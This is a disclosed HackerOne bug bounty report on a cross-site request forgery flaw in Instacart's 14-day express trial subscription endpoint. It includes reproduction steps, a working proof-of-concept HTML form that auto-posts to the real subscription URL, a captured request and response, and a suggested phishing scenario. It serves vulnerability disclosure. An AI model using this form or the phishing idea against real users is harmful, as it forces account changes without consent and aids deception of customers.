# CSRF Trial 14 days express subscription

## Report Details
- **Report ID**: 334139
- **URL**: https://hackerone.com/reports/334139
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-04-06T03:28:52.331Z
- **Disclosed**: 2019-02-27T23:39:03.244Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Description
========

When a new user has been registered, Instacart pops up a message offering the user for a limited time 14 days express trial, in which the user may decide to skip and subscribe later on decision. The research has found that the express trial subscription endpoint does not implement any protection against CSRF attack, the following list possible cases in which the endpoint may needed protection:

- The new user, may decide to skip the subscription and try the free version first for a while, and later (for example, before actual service purchase) try for 14 days express, in this case the attacker force user subscription via CSRF attack.

- The user who was CSRFed may believe that he is using the free version - consuming trial time, and missing the express features.

- The effect of CSRF vulnerability in this endpoint means that new user is subscribe for express trial automatically. Serious attacker may create a phishing site claiming that all new user will get unlimited subscription (by clicking the phishing site subscription button), the attacker may tell user to just ignore the remaining days they see, all the users will believe that because clicking the attacker site does affect they instacart account, plus the site can be trusty (e.g: premiumsecret-instacart.com), the user may provide further personal detail on attacker requests.

Reproduction
=========

1) Go to instacart.com
2) Register for a new test account, e.g: testuser1@email.com
3) After registration, you will see limited offer popup like the following image:

{F282462}

4) Click 'No thank', you will be redirected to the welcome page. also you will see reminder at the top right corner that you can get free trial later.

5) With current browser, open a new tap and go to CSRF page which is shown in the next section.
6) Clicking 'submit' responses with the following message

{F282464}

7) Refresh the instacart page, you will see message as follow:

{F282465}

CSRF Page
=======

```
<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://www.instacart.com/v3/subscriptions" method="POST">
<input type="hidden" name="free_trial" id="free_trial" value="true">
<input type="hidden" name="promo" id="promo" value="true">
<input type="hidden" name="term" id="term" value="year">
<input type="submit">
</form>
</body>
</html>
```

Sample Request/Response from Burp
=========================

Request:

```
POST /v3/subscriptions HTTP/1.1
Host: www.instacart.com
Connection: close
Content-Length: 36
Cache-Control: max-age=0
Origin: http://localhost
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost/poc/csrf/csrf-instacart.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7
Cookie: ...

free_trial=true&promo=true&term=year
```

Response:

```
HTTP/1.1 200 OK
Date: Fri, 06 Apr 2018 03:27:47 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Server: nginx
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
ETag: W/"9409a344d9975c9f6b21a4b5dba1efb9"
X-Jobs: jobs@instacart.com
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: ...
Set-Cookie: ...
Set-Cookie: ...
X-Request-Id: c2a53724-d5b2-4171-8c7a-bc01ed066571
X-Runtime: 0.224540
Vary: Origin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Length: 560

{
  "subscription": {
    "id": "3178765",
    "credit_card_id": "",
    "duration_in_days": 14,
    "attributes": [
      "current",
      "can_receive_renewal_reminder",
      "free",
      "trial"
    ],
    "autorenew": true,
    "current?": true,
    "starts_on_date": "2018-04-06T03:27:46.920Z",
    "starts_on": "April  6, 2018",
    "ends_on_date": "2018-04-20T06:59:59.999Z",
    "ends_on": "April 20, 2018",
    "trial": true,
    "send_reminder_on": "2018-04-17T06:59:59.999Z",
    "send_secondary_reminder_on": null,
    "time_remaining": "14 days",
    "next_price": "$149",
    "next_term": null,
    "term": "year",
    "term_length": "year",
    "plan_type": "trial",
    "subscription_plan_id": "1"
  }
}
```

Recommend Fix
===========

- Review how the trial subscription endpoint works, make sure it implements CSRF protection.

```
(POST) https://www.instacart.com/v3/subscriptions
```

## Impact

Attacker can force new user to subscribe 14 days express trail period

The hacker selected the **Cross-Site Request Forgery (CSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.instacart.com/v3/subscriptions

**Verified**
Yes

**Can a victim be forced to perform a sensitive state-change operation unknowningly?**
Yes

**What state-change operation can be performed?**
Trial 14 days express subscription

## Attachments
- 1.png
- 2.png
- 3.png
